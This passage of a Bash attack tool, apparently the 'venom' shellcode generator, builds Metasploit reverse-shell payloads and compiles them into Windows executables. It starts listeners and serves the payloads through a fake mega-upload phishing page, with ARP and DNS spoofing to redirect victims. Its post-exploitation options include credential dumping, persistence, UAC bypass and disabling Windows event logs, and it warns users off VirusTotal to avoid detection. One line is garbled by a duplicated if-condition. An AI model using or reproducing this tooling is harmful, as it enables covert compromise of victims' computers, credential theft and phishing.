           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
           fi
         fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 350) > /dev/null 2>&1

  if [ "$P0" = "persistence.rc" ]; then
  M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.exe on target every 23 hours" --width 300) > /dev/null 2>&1

    cd $IPATH/aux
    # Build persistence script (AutoRunStart='multi_console_command -r')
    cp persistence.rc persistence[bak].rc
    sed -i "s|N4m|$N4m.exe|g" persistence.rc
    sed -i "s|IPATH|$IPATH|g" persistence.rc
    sed -i "s|M1P|$M1P|g" persistence.rc

    # Build listenner resource file
    echo "use exploit/multi/handler" > $lhost.rc
    echo "set LHOST $lhost" >> $lhost.rc
    echo "set LPORT $lport" >> $lhost.rc
    echo "set PAYLOAD $paylo" >> $lhost.rc
    echo "exploit" >> $lhost.rc
    mv $lhost.rc $IPATH/output/$lhost.rc
    cd $IPATH

    elif [ "$P0" = "privilege_escalation.rc" ]; then
      cd $IPATH/aux
      # backup files needed
      cp privilege_escalation.rc privilege_escalation[bak].rc
      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb
      # Build resource files needed
      sed -i "s|N4m|$N4m.exe|g" privilege_escalation.rc
      sed -i "s|IPATH|$IPATH|g" privilege_escalation.rc
      sed -i "s|N4m|$N4m.exe|g" enigma_fileless_uac_bypass.rb
      # reload metasploit database
      echo "[☠] copy post-module to msf db!"
      cp enigma_fileless_uac_bypass.rb $pHanTom/post/windows/escalate/enigma_fileless_uac_bypass.rb
      echo "[☠] reloading -> Metasploit database!"
      xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
      cd $IPATH


  elif [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi


  else

    echo "do nothing" > /dev/null 2>&1

fi


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.exe|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.exe $ApAcHe/$N4m.exe > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.exe|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.exe $ApAcHe/$N4m.exe
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi
          fi


        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
           else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi
          fi
        fi
   fi

sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/exec_bin[bak].c $InJEc3 > /dev/null 2>&1
mv $IPATH/templates/exec_bin2[bak].c $IPATH/templates/exec_bin2.c > /dev/null 2>&1
mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
mv $IPATH/aux/msf/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/msf/enigma_fileless_uac_bypass.rb > /dev/null 2>&1
mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m.exe > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}




# -----------------------------------------------------
# build shellcode in PSH-CMD format (windows-platforms)
# using a C template embbebed with powershell shellcode
# ------------------------------------------------------
sh_shellcode6 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_winhttps" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 370) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: psh-cmd" --width 300) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="psh-cmd";fi

echo "[☠] Building shellcode -> psh-cmd format ..."
sleep 2
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   echo "[☠] meterpreter over SSL sellected ..";sleep 1
fi

echo "" > $IPATH/output/chars.raw
# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | LPORT   : $lport
    | LHOST   : $lhost
    | FORMAT  : PSH-CMD -> WINDOWS
    |_PAYLOAD : $paylo

!

# use metasploit to build shellcode (msf encoded)
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f psh-cmd > $IPATH/output/chars.raw"
else
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd > $IPATH/output/chars.raw"
fi


str0=`cat $IPATH/output/chars.raw | awk {'print $12'}`
echo "$str0" > $IPATH/output/chars.raw
# display shellcode
echo ""
echo "[☠] obfuscating -> base64 encoded!"
sleep 3
echo $str0
echo "" && echo ""


   # check if all dependencies needed are installed
   # check if template exists
   if [ -e $InJEc15 ]; then
      echo "[☠] exec_psh.c -> found!"
      sleep 2
   else
      echo "[☠] exec_psh.c -> not found!"
      exit
   fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw  -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw  -> not found!"
      exit
      fi

   # check if mingw32 exists
   c0m=`which $ComP`> /dev/null 2>&1
   if [ "$?" -eq "0" ]; then
      echo "[☠] mingw32 compiler -> found!"
      sleep 2
 
   else

      echo "[☠] mingw32 compiler -> not found!"
      echo "[☠] Download compiler -> apt-get install mingw32"
      echo ""
      sudo apt-get install mingw32
      echo ""
      fi


# EDITING/BACKUP FILES NEEDED
echo "[☠] editing/backup files..."
cd $IPATH/templates
cp $InJEc15 $IPATH/templates/exec_psh[bak].c
echo "[☠] Injecting shellcode -> $N4m.exe!"
sleep 2
sed "s|InJ3C|$str0|" exec_psh.c > final.c


# COMPILING SHELLCODE USING mingw32
echo "[☠] Compiling using mingw32..."
sleep 2
# special thanks to astr0baby for mingw32 -mwindows flag :D
$ComP final.c -o $N4m.exe -mwindows
mv $N4m.exe $IPATH/output/$N4m.exe


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.exe\n\nchose how to deliver: $N4m.exe" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then

          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi

          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else

          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 350) > /dev/null 2>&1

  if [ "$P0" = "persistence.rc" ]; then
  M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.exe on target every 23 hours" --width 300) > /dev/null 2>&1

    cd $IPATH/aux
    # Build persistence script (AutoRunStart='multi_console_command -r')
    cp persistence.rc persistence[bak].rc
    sed -i "s|N4m|$N4m.exe|g" persistence.rc
    sed -i "s|IPATH|$IPATH|g" persistence.rc
    sed -i "s|M1P|$M1P|g" persistence.rc

    # Build listenner resource file
    echo "use exploit/multi/handler" > $lhost.rc
    echo "set LHOST $lhost" >> $lhost.rc
    echo "set LPORT $lport" >> $lhost.rc
    echo "set PAYLOAD $paylo" >> $lhost.rc
    echo "exploit" >> $lhost.rc
    mv $lhost.rc $IPATH/output/$lhost.rc
    cd $IPATH

    elif [ "$P0" = "privilege_escalation.rc" ]; then
      cd $IPATH/aux
      # backup files needed
      cp privilege_escalation.rc privilege_escalation[bak].rc
      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb
      # Build resource files needed
      sed -i "s|N4m|$N4m.exe|g" privilege_escalation.rc
      sed -i "s|IPATH|$IPATH|g" privilege_escalation.rc
      sed -i "s|N4m|$N4m.exe|g" enigma_fileless_uac_bypass.rb
      # reload metasploit database
      echo "[☠] copy post-module to msf db!"
      cp enigma_fileless_uac_bypass.rb $pHanTom/post/windows/escalate/enigma_fileless_uac_bypass.rb
      echo "[☠] reloading -> Metasploit database!"
      xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
      cd $IPATH


  elif [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi


  else

    echo "do nothing" > /dev/null 2>&1

fi

      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.exe|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.exe $ApAcHe/$N4m.exe > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.exe|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.exe $ApAcHe/$N4m.exe
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ]; thenif [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi
          fi


        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi
          fi
        fi
   fi

sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/exec_psh[bak].c $InJEc15 > /dev/null 2>&1
mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
mv $IPATH/aux/msf/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/msf/enigma_fileless_uac_bypass.rb > /dev/null 2>&1
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/templates/final.c > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m.exe > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}




# ------------------------------------------------------------
# build shellcode in ruby (windows-platforms)
# veil-evasion ruby payload reproduction (the stager)...
# ruby_stager (template) by: @G0tmi1k @chris truncker @harmj0y
# ------------------------------------------------------------
sh_shellcode7 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
